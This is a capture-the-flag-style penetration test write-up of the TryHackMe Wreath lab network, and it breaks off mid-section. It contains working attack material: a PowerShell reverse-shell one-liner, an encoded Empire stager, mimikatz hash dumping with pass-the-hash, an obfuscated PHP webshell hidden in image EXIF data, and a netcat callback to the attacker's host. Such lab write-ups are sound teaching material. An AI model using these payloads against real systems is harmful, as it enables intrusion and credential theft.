# Penetration Test Report - Wreath Network | TryHackMe

## Confidentiality Statement

This document is the exclusive property of Thomas Wreath and V3r4x and contains proprietary and confidential information relating to both parties.  As such, duplication, redistribution, or use, in whole or in part, in any form, requires consent of both Thomas Wreath and V3r4x.

V3r4x may share this document with auditors under non-diclosure agreements to demonstrate penetration test requirement compliance.

## Executive Summary

V3r4x was contracted by Thomas Wreath to conduct a penetration test against his home network in order to determine its exposure to a targeted attack.  All activities were conducted in a manner that simulated a malicious threat actor engaged in a targeted attack against Thomas Wreath's home network with the goals of:

- Identifying if a remote attacker could penetrate Thomas Wreath's home network.
- Determining the impact of a security breach on:
	- Confidentiality of Thomas Wreath's private data.
	- Internal infrastructure and and availability of Thomas Wreath's home network.

Efforts were placed on the identification and exploitation of security weaknesses that could allow a remote attacker to gain unauthorised access to sensitive data.  The attacks were conducted with the level of access that a general Internet user would have.

#### Scope

During the briefing, Thomas Wreath described the overall network infrastructure:

"*There are two machines on my home network that host projects and stuff I'm working on in my own time -- one of them has a webserver that's port forwarded, so that's your way in if you can find a vulnerability! It's serving a website that's pushed to my git server from my own PC for version control, then cloned to the public facing server. See if you can get into these! My own PC is also on that network, but I doubt you'll be able to get into that as it has protections turned on, doesn't run anything vulnerable, and can't be accessed by the public-facing section of the network. Well, I say PC -- it's technically a repurposed server because I had a spare license lying around, but same difference.*"

Thomas Wreath then provided the IP address of the single public-facing webserver, but permitted V3r4x to assess the security posture of the internal git server and personal PC.

- `10.200.101.200`/`10.200.90.200`

**Note:** During the assessment, the network was reset multiple times which resulted in an IP address change (`10.200.101.0/24` - `10.200.90.0/24`).

#### Disclaimer

The penetration test was conducted within the Wreath Network on the TryHackMe platform between the 19/08/2022 to 09/09/2022.  A penetration test is considered a snapshot in time.  The findings and recommendations present within this document reflect the information gathered during the assessment and not any changes or modifications made outside this period.

As such, time-limited engagements do not allow for a full evaluation of all security controls.  V3r4x prioritized the assessment to identify the weakest security controls an attacker would exploit, in accordance with the requirements outlined with Thomas Wreath.  V3r4x recommends conducting similar assessments on an annual basis by internal or third-party assessors to ensure the continued success of the controls.

#### Summary of Results

V3r4x evaluated Thomas Wreath's external security posture through an external network penetration test from August 19th, 2022 to September 9th, 2022.  By leveraging a series of attacks, V3r4x found critical level vulnerabilities that allowed full internal access to Thomas Wreath's home network.  It is highly recommended that Thomas Wreath addresses these vulnerabilities as soon as possibler as the vulnerabilities are easily found through basic reconnaissance and exploitation.





-----



*Learn how to pivot through a network by compromising a public-facing web machine and tunnelling your traffic to access other machines in Wreath's network.*



---

## Notes

Network has three stages:
- **Running**: fully operational and can be connected to
- **Stopped**: network has gone to sleep - can be resetted by clicking "**Start**"
- **Resetting**: network is currently in the process of being wiped back to default state

Brief:
- Machine 1:
	- Public-facing webserver
	- hosting website pused to `git` server which is then cloned to the public-facing server
- Machine 2:
	- Self-hosted (internal) git server
	- Likely a Windows Server configuration
- Machine 3:
	- PC with AV installed (likely Windows)
	- Cannot be accessed from webserver

###### Enumeration (Webserver)

```console
$ nmap -T4 -A -p- 10.200.101.200
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-19 19:20 BST
Nmap scan report for 10.200.101.200
Host is up (0.046s latency).
Not shown: 65387 filtered tcp ports (no-response), 143 filtered tcp ports (admin-prohibited)
PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 9c:1b:d4:b4:05:4d:88:99:ce:09:1f:c1:15:6a:d4:7e (RSA)
|   256 93:55:b4:d9:8b:70:ae:8e:95:0d:c2:b6:d2:03:89:a4 (ECDSA)
|_  256 f0:61:5a:55:34:9b:b7:b8:3a:46:ca:7d:9f:dc:fa:12 (ED25519)
80/tcp    open   http       Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_http-title: Did not follow redirect to https://thomaswreath.thm
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
443/tcp   open   ssl/http   Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_http-title: Thomas Wreath | Developer
| http-methods: 
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB
| Not valid before: 2022-08-19T18:17:40
|_Not valid after:  2023-08-19T18:17:40
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
|_ssl-date: TLS randomness does not represent time
9090/tcp  closed zeus-admin
10000/tcp open   http       MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Aggressive OS guesses: HP P2000 G3 NAS device (91%), Linux 2.6.32 (90%), Linux 2.6.32 - 3.1 (90%), Linux 5.0 (90%), Linux 5.1 (90%), Ubiquiti AirOS 5.5.9 (90%), Linux 5.0 - 5.4 (89%), Ubiquiti Pico Station WAP (AirOS 5.2.6) (89%), Linux 2.6.32 - 3.13 (89%), Linux 3.0 - 3.2 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 9090/tcp)
HOP RTT      ADDRESS
1   51.50 ms 10.50.102.1
2   53.09 ms 10.200.101.200

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 185.39 seconds
```

Summary:
- 22 (SSH): OpenSSH 8.0 (protocol 2.0)
- 80/443 (HTTP/S): Apache httpd 2.4.37 (centos)
	- Attempted redirect to `https://thomaswreath.thm`
- 9090 (zeus-admin): **closed**
- 10000 (HTTP: MiniServ 1.890 (Webmin htpd)

Opening web browser and navigating to `http://10.200.101.200`:

![[trouble_finding_site.png]]

Added `10.200.101.200` to `/etc/hosts` and tried again:

![[thomaswreath_homepage.png]]

Find address and contact information at the bottom of the page:

![[address_and_contact_info.png]]

Looking at the highest port, it appears it is vulnerable to a remote code execution according to [InfosecMatter](https://www.infosecmatter.com/nessus-plugin-library/?id=127911) - CVE-2019-15107.  Other sources are listed below:
- [SensorsTechForum](https://sensorstechforum.com/cve-2019-15107-webmin/)
- [Webmin](https://www.webmin.com/exploit.html)

###### Exploitation (Webserver)

Using an exploit by [MuirlandOracle](https://github.com/MuirlandOracle/CVE-2019-15107):

```console
$ git clone https://github.com/MuirlandOracle/CVE-2019-15107
...
$ cd CVE-2019-15107
$ pip3 install -r requirements.txt
$ chmod +x ./CVE-2019-15107.py
$ ./CVE-2019-15107.py 10.200.101.200
```

![[pseudoshell_as_root.png]]

From the above, it appears that the server is running as `root`.

Attempt to get reverse shell:

![[webserver_revshell_victim.png]]

![[webserver_revshell_attacker.png]]

Can get the user hashes from `/etc/shadow`:

![[webserver_etc_shadow.png]]

Can obtain the `root` user's SSH key for future login:

![[root_user_ssh_key.png]]

###### Pivoting

Retrieve information from compromised target:

![[pivoting_information.png]]

###### Git Server

Downloading [static nmap binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap?raw=true) and renaming it to `nmap-v3r4x`.  Uploading to target machine with `python3` and `curl`:

```console
# Attacker machine
$ sudo python3 -m http.server 80

# Target machine
$ curl ATTACKING_IP/nmap-USERNAME -o /tmp/nmap-USERNAME
$ cd /tmp
$ chmod +x nmap-USERNAME
```

![[static_nmap_upload.png]]

Scanning the internal network:

```console
$ ./nmap-v3r4x -sn 10.200.101.1-255 -oN scan-v3r4x
```

![[internal_nmap_scan.png]]

The hosts ending in `.1` and `.250` can be excluded as they are part of the AWS and OpenVPN infrastructure.  This means that, excluding `.200`, there are **two hosts** alive on the network - `10.200.101.100` and `10.200.101.150`.

![[internal_nmap_results.png]]

As shown above, the host `10.200.101.100` returned with all ports as filtered.  However, there are **three ports** open on `10.200.101.150`, namely ports `80`, `3389`, and `5985`.

Creating a connection with `sshuttle` to the internal network:

![[sshuttle_connection.png]]

Navigating to the `http://10.200.101.150:80/` reveals a Django 404 error page:

![[django_error_page.png]]

It appears that the application running on this server is `gitstack`.  Going to `/gitstack` also shows a login page with suggested default credentials:

![[gitstack_login.png]]

However, these credentials do not provide access.  A quick search using `searchsploit` shows **three RCE exploits**:

![[gitstack_searchsploit.png]]

Creating a copy of the Python exploit:

```console
$ searchsploit -m 43777
```

However, the exploit uses DOS line endings which can cause problems during execution on a Linux machine.  These line endings can be converted via `dos2unix` or `sed`.

```console
$ dos2unix ./43777.py

$ sed -i 's/\r//' ./43777.py
```

Firstly, ensure the IP address at the top of the file is pointing to the git server host.  If a proxy was chosen this will be `localhost:chosen_port` (e.g., `localhost:8000`) instead.  Then, the exploit can be executed:

![[gitserver_exploit.png]]

The webshell responds to a POST request via the `a` parameter.  Using BurpSuite, we are able to execute additional commands:

![[burpsuite_repeater.png]]

However, the target machine cannot ping the attacker machine - can be verified through the `ping -c 4` command and `tcpdump` running on the attacker's machine.

On the pivot machine (`10.200.101.200`), we can first open a desired port through the firewall and upload a [static netcat binary](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat) via `curl`:

![[pivot_machine_nc_listener.png]]

Then, through BurpSuite, we create a reverese shell via `powershell`:

```powershell
powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('10.200.101.200',17000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

This then can be URL encoded via BurpSuite by pressing `CTRL+U`:

![[powershell_url_encoded.png]]

Sending this request gets a shell on the pivot machine:

![[pivot_machine_shell.png]]

From initial enumeration, we found that ports `3389` and `5895` are open.  This means that we can obtain a GUI through RDP (port `3389`) or a stable CLI shell via WinRM (port `5895`).  Firstly, we create a user with the correct privileges:

![[remote_user_gitserver.png]]

To establish a CLI shell via WinRM, we need to install `evil-winrm` on the attacker machine:

```console
$ sudo gem install evil-winrm
```

This can then be executed with the user we created in the previous step:

![[evil_winrm_cli_shell.png]]

Instead, we can use RDP:

```console
$ xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share
```

This will also create a shared drive between the target and the attacker machine, sharing the `/usr/share/windows-resources` directory.  This way, we can access `mimikatz` via an Administrator `cmd.exe` instance:

![[mimikatz_instance.png]]

As such, we can dump the SAM hashes of the system using the `lsadump::sam` command:

```
User: Administrator
  Hash NTLM: 37db630168e5f82aafa8461e05c6bbd1
...
User: Thomas
  Hash NTLM: 02d90eda8f6b6b06c32d5f207831101f
```

Can use [Crackstation](https://crackstation.net/) to crack Thomas' hash:

![[crackstation_thomas_password.png]]

For the sake of the Wreath network, using `evil-winrm` with pass-the-hash and the Administrator hash, we will be able to get persistence after the network is reset.

```console
$ evil-winrm -u Administrator -H ADMIN_HASH -i IP
```

Using Empire to configure a hop listener to access the Git server:

```console
(Empire) > uselistener http
(Empire: uselistener/http) > set Name CLIHTTP
[*] Set Name to CLIHTTP
(Empire: uselistener/http) > set Host 10.50.91.109
[*] Set Host to 10.50.91.109
(Emprie: uselistener/http) > set Port 8000
[*] Set Port to 8000
(Empire: uselistener/http) > execute 
```

![[empire_hop_listener_config.png]]

As shown, we have written a variety of files into a new `http_hop/` directory within `/tmp` of our attacker machine.  This will be replicated on the web server when we serve the files.

Generating a stager using the `multi/launcher` Empire stager:

![[empire_multi_launcher_hop.png]]

Now typing `execute` to retrieve the stager:

```
powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAJABSAGUAZgA9AFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBlAHQARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdAB2AGEAbAB1AGUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AGUAKQA7AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBFAHYAZQBuAHQAaQBuAGcALgBFAHYAZQBuAHQAUAByAG8AdgBpAGQAZQByAF0ALgBHAGUAdABGAGkAZQBsAGQAKAAnAG0AXwBlAG4AYQBiAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwASQBuAHMAdABhAG4AYwBlACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBUAHIAYQBjAGkAbgBnAC4AUABTAEUAdAB3AEwAbwBnAFAAcgBvAHYAaQBkAGUAcgAnACkALgBHAGUAdABGAGkAZQBsAGQAKAAnAGUAdAB3AFAAcgBvAHYAaQBkAGUAcgAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAEcAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAApACwAMAApADsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAHcAYwAuAFAAcgBvAHgAeQA9AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARABlAGYAYQB1AGwAdABXAGUAYgBQAHIAbwB4AHkAOwAkAHcAYwAuAFAAcgBvAHgAeQAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAD0AIABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBDAHIAZQBkAGUAbgB0AGkAYQBsAEMAYQBjAGgAZQBdADoAOgBEAGUAZgBhAHUAbAB0AE4AZQB0AHcAbwByAGsAQwByAGUAZABlAG4AdABpAGEAbABzADsAJABLAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAQgB5AHQAZQBzACgAJwAlACoAPAAsAEMAZABRADIAQgB4AEQAKQBVAC4ANwBsAHIAdwBUAGoAIwArAFsAMwBlADEARQBYAE8AewBQACYAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAG8AdQBuAHQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgB4AG8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAHMAZQBzAHMAaQBvAG4APQBnAC8ASQBjAEsANgBJAGQAaABkAGoARABFAGsATgB1AEYAawAzAEUAcABmADUAUwB4AC8ANAA9ACIAKQA7ACQAcwBlAHIAPQAkACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJwBhAEEAQgAwAEEASABRAEEAYwBBAEEANgBBAEMAOABBAEwAdwBBAHgAQQBEAEEAQQBMAGcAQQB5AEEARABBAEEATQBBAEEAdQBBAEQAawBBAE0AQQBBAHUAQQBEAEkAQQBNAEEAQQB3AEEARABvAEEATgBBAEEAMwBBAEQAQQBBAE0AQQBBAHcAQQBBAD0APQAnACkAKQApADsAJAB0AD0AJwAvAG4AZQB3AHMALgBwAGgAcAAnADsAJABoAG8AcAA9ACcAaAB0AHQAcABfAGgAbwBwACcAOwAkAGQAYQB0AGEAPQAkAHcAYwAuAEQAbwB3AG4AbABvAGEAZABEAGEAdABhACgAJABzAGUAcgArACQAdAApADsAJABpAHYAPQAkAGQAYQB0AGEAWwAwAC4ALgAzAF0AOwAkAGQAYQB0AGEAPQAkAGQAYQB0AGEAWwA0AC4ALgAkAGQAYQB0AGEALgBsAGUAbgBnAHQAaABdADsALQBqAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAYQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==
```

Over in the compromised webserver, within the `/tmp` directory:

![[replicating_tmp_structure.png]]

We then need to serve the files on `47000` (the port we chose when configuring the `http_hop` listener) - creating the jumpserver.  Since we know that the webserver is running PHP. we can use the PHP development webserver as follows:

```console
[root@prod-serv hop-v3r4x]# php -S 0.0.0.0:47000 &
[1] 2559
[root@prod-serv hop-v3r4x]# PHP 7.2.24 Development Server started at Mon Sep  5 19:47:24 2022
Listening on http://0.0.0.0:47000
Document root is /tmp/hop-v3r4x
Press Ctrl-C to quit.

[root@prod-serv hop-v3r4x]# ss -tulwn | grep 47000
tcp     LISTEN   0        128              0.0.0.0:47000          0.0.0.0:*
```

With the previous BurpSuite session, we can send the payload through URL encoding:

![[powershell_payload_burpsuite.png]]

And we get an agent back:

![[git_server_agent.png]]

We can now finally enumerate the personal PC.  Firstly, we connect to the system using the Administrator's NTLM hash with `evil-winrm` and include the Empire scripts directory

```console
$ evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.90.150 -s /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/
```

Then, within `evil-winrm`  we initialise the `Invoke-Portscan.ps1` script and execute it against the top 50 ports:

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Portscan.ps1
*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Portscan -Hosts 10.200.90.100 -TopPorts 50


Hostname      : 10.200.90.100
alive         : True
openPorts     : {80, 3389}
closedPorts   : {}
filteredPorts : {445, 443, 110, 21...}
finishTime    : 9/5/2022 9:13:24 PM
```

As above, we scan the 50 most common open ports.  The output shows that we have two ports open: `80` and `3389`.

We can then access the webserver via chisel.  Firstly, we add a firewall rule:

```console
*Evil-WinRM* PS C:\Users\Administrator\Documents> netsh advfirewall firewall add rule name="Chisel-exec" dir=in action=allow protocol=tcp localport=44444
Ok.
```

Then, we upload a chisel binary to the system and execute it:

```console
*Evil-WinRM* PS C:\Users\Administrator\Documents> upload /home/v3r4x/Desktop/thm/wreath/tools/Pivoting/Windows/chis_1.7.3_windows_amd64
Info: Uploading /home/v3r4x/Desktop/thm/wreath/tools/Pivoting/Windows/chisel_1.7.3_windows_amd64 to C:\Users\Administrator\Documents\chisel_1.7.3_windows_amd64                                                                         

                                                             
Data: 11758248 bytes of 11758248 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\Users\Administrator\Documents> .\chisel_1.7.3_windows_amd64 server -p 44444 --socks5
```

We also need to run `chisel` on our attacker machine as the client (listener):

```console
$ ./chisel_1.7.3_linux_amd64 client 10.200.90.150:44444 9090:socks
```

![[chisel_server_connection.png]]

With the connection established, we can configure a `SOCKS5` proxy within FoxyProxy and connect to the webserver running on `10.200.90.100`:

![[foxyproxy_socks5_chisel.png]]

![[personal_pc_webserver.png]]

Wappalyzer detects the following:

![[wappalyzer_fingerprinting.png]]

The site appears to be a carbon copy of the original website running on `10.200.90.200`.  This means we can download the source code to the website and analyse it manually instead of using fuzzing techniques.

Using `evil-winrm` on `10.200.90.150`, we can download the `Website.git` file within `C:\GitStack\Repositories\Website.git` and rename it to the default `.git`. 

```
*Evil-WinRM* PS C:\GitStack> download Repositories\Website.git

$ mv Website.git .git
```

Since the `.git` file contains the meta-information for the repository, we can then use [GitTools](https://github.com/internetwache/GitTools) to rebuild the repository on our local machine.

```console
$ git clone https://github.com/internetwache/GitTools
```

We can then use the `extractor.sh` script within `GitTools` to recreate the repo:

```console
$ GitTools/Extractor/extractor.sh . Website
...
$ ls -la
total 20
drwxr-xr-x 5 v3r4x v3r4x 4096 Sep  6 18:56 .
drwxr-xr-x 9 v3r4x v3r4x 4096 Sep  6 18:28 ..
drwxr-xr-x 6 v3r4x v3r4x 4096 Sep  6 18:56 .git
drwxr-xr-x 7 v3r4x v3r4x 4096 Sep  6 18:30 GitTools
drwxr-xr-x 5 v3r4x v3r4x 4096 Sep  6 18:56 Website
```

We then see three commits within the `Website/` directory:

```console
$ ls Website
0-70dde80cc19ec76704567996738894828f4ee895  2-345ac8b236064b431fa43f53d91c98c4834ef8f3  1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2
```

As such, we can use the following Bash one-liner to figure out the order of these commits:

```console
$ cd Website
$ separator="======================================="; for i in $(ls); do printf "\n\n$separator\n\033[4;1m$i\033[0m\n$(cat $i/commit-meta.txt)\n"; done; printf "\n\n$separator\n\n\n"

=======================================
0-70dde80cc19ec76704567996738894828f4ee895
tree d6f9cc307e317dec7be4fe80fb0ca569a97dd984
author twreath <me@thomaswreath.thm> 1604849458 +0000
committer twreath <me@thomaswreath.thm> 1604849458 +0000

Static Website Commit


=======================================
1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2
tree 03f072e22c2f4b74480fcfb0eb31c8e624001b6e
parent 70dde80cc19ec76704567996738894828f4ee895
author twreath <me@thomaswreath.thm> 1608592351 +0000
committer twreath <me@thomaswreath.thm> 1608592351 +0000

Initial Commit for the back-end


=======================================
2-345ac8b236064b431fa43f53d91c98c4834ef8f3
tree c4726fef596741220267e2b1e014024b93fced78
parent 82dfc97bec0d7582d485d9031c09abcb5c6b18f2
author twreath <me@thomaswreath.thm> 1609614315 +0000
committer twreath <me@thomaswreath.thm> 1609614315 +0000

Updated the filter


=======================================
```

As above, we have `Updated the filter`, `Initial Commit for the back-end`, and `Static Website Commit`.  Logically, we can see that `Static Website Commit` is the first commit since it has no parent.  The order is as follows:

1. `70dde80cc19ec76704567996738894828f4ee895`
2. `82dfc97bec0d7582d485d9031c09abcb5c6b18f2`
3. `345ac8b236064b431fa43f53d91c98c4834ef8f3`

Therefore, the most up-to-date copy of the site exists within the `2-345ac8b236064b431fa43f53d91c98c4834ef8f3/` directory.  Navigating to this directory and searching for `.php` files:

```
$ find . -name "*.php"
./resources/index.php
```

We can open this in a text editor to analyse the code.  Within the code, Thomas has left a `ToDo` comment:

![[thomas_todo_comment.png]]

A deeper look at the code reveals that its purpose is to serve as a file-upload point.  The `ToDo` comment also suggests that the filter is very basic and only reliyes on basic authentication.

![[image_check.png]]

The highlighted code segment first checks if a file is an image.  Since images have their dimensions encoded within its exif data, `getimagesize()` method is used to return these dimensions if the file is an image, otherwise it will return `False`.

The if statement checks two conditions.  The `!$size` checks to see if the `$size` variable contains the boolean `False`.  The `!in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts)` first splits the filename with `.` as the delimiter and checks if a valid image extension (`.jpg`, `.jpeg`, `.png`, `.gif`) exists within the array.  However, we can bypass this by uploading file called `image.jpeg.php` as it will return true since it contains the `.jpeg` file extension.

If `True` is returned from the if-statement, the file is then uploaded to an `uploads/` directory with its original name.

We now know:
- We can access the page
- It will ask us for credentials
- We are able to upload image files
- There are two (insecure) filters which can be bypassed

![[resources_login.png]]

Using the credentials `thomas:i<3ruby` obtained from the git server, we are able to login:

![[ruby_image_upload.png]]

First, we should test the form by uploading a normal image which can be verified by navigating to the `uploads/` directory:

![[test_image_upload_successful.png]]

![[verify_test_image_upload.png]]

We now need to test for filter bypassing.  To bypass the first filter, we simply change the name of our image to include a valid image file extension (e.g., `.jpg`, `.jpeg`, `.png` or `.gif`) plus `.php`.

```console
$ mv test_image.jpg{,.php}
$ ls
test_imag.jpg.php
```

Once uploaded to the form, it shows the same success message as before - can also be confirmed by navigating to `/resources/uploads/test_image.jpg.php`.

Since the `getimagesize()` function checks for attributes only an image would have, we need to supply an image.  However, in this case, we can upload a genuine image file which contains a PHP webshell and since it is a `.php` file, it will be executed by the website.  We can do this by embedding the webshell within the `Comment` field of the image's exifdata.

```console
$ exiftool -Comment="<?php echo \"<pre>Test Payload</pre>\"; die(); ?>" test-v3r4x.jpeg.php
    1 image files updated
```

![[embedded_test_payload.png]]

This also uploads successfully with the payload executing:

![[successful_test_payload.png]]

Now that we have an upload point, we can create a PHP script which will bypass the AV software - assume Windows Defender for the time being.

```php
// Payload v1
<?php
	$cmd = $_GET["wreath"];
	if (isset($cmd)) {
		echo "<pre>" . shell_exec($cmd) . "</pre>";
	}
	die();
?>
```

From the above, we check if a `GET` parameter called `wreath` has been set.  If so, the `shell_exec()` method is executed within `<pre>...</pre>` tags.  We then use `die()` to prevent the rest of the image from showing up as random text on the screen.

Note that this is more verbose than the standard `<?php system($_GET["cmd"]); ?>` one-liner.

We then use [PHP obfuscator](https://www.gaijin.at/en/tools/php-obfuscator) to provide further obfuscation.  However, doing this makes the code hard to read as it obscures variable and function names as well as encodes strings.

![[php_obfuscator_v1.png]]

We then get the following obfuscated payload:

```php
// Payload v2 (obfuscated)
<?php $l0=$_GET[base64_decode('d3JlYXRo')];if(isset($l0)){echo base64_decode('PHByZT4=').shell_exec($l0).base64_decode('PC9wcmU+');}die();?>
```

Since this is passed to a bash command, we need to escape the dollar signs:

```php
<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>
```

Saving an image as `shell-v3r4x.jpeg.php` and using `exiftool` to embed the payload into the image

```console
$ exiftool -Comment="<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>" shell-v3r4x.jpeg.php
    1 image files updated

$ exiftool shell-v3r4x.jpeg.php
ExifTool Version Number         : 12.44
File Name                       : shell-v3r4x.jpeg.php
...
Comment                         : <?php $p0=$_GET[base64_decode('d3JlYXRo')];if(isset($p0)){echo base64_decode('PHByZT4=').shell_exec($p0).base64_decode('PC9wcmU+');}die();?>
...
```

Uploading the file to the website and access it shows:

![[successful_webshell_upload.png]]

We can then extract the hostname and user info:

![[personal_pc_hostname.png]]

![[personal_pc_whoami.png]]

We now should upgrade to a full reverse shell on the target's personal PC.  To do this, we compile a `netcat.exe` from [init0x33's repo](https://github.com/int0x33/nc.exe/):

```console
$ git clone https://github.com/int0x33/nc.exe/
$ sudo apt isntall mingw-w64
$ cat < Makefile
#CC=i686-pc-mingw32-gcc
#CC=x86_64-pc-mingw32-gcc
CC=x86_64-w64-mingw32-gcc
$ make 2>/dev/null
```

We then start a Python HTTP server on port `80` to download the file.  We first need to determine whether to use `curl.exe` or `certutil.exe`:

![[webshell_certutil_exe.png]]

`certutil.exe` will likely flag the file as malicious, so we can use curl and escape the backslashes since it is being passed to bash:

```
curl http://10.50.91.109/nc-v3r4x.exe -o c:\\windows\\temp\\nc-v3r4x.exe
```

We can then execute `nc-v3r4x.exe` with PowerShell and an accompanying netcat listener on our attacker machine:

```
powershell.exe c:\\windows\\temp\\nc-v3r4x.exe 10.50.91.109 443 -e cmd.exe
```

When executed within the webshell, we receive a callback on our netcat listener:

![[netcat_shell_callback.png]]

However, as we established, the webserver is not running with system privileges, so we need to enumerate the target for privilege escalation vectors.

![[whoami_priv.png]]

We can potentially exploit the `SeImpersonatePrivilege`.  However, this is likely enabled because of XAMPP meaning that it won't be a good privesc vector in isolation.

![[whoami_groups.png]]

As above, the current user is not in the Local Administrators group so cannot be used for any further privilege escalation.

We can then look at Windows services using the following command:

```
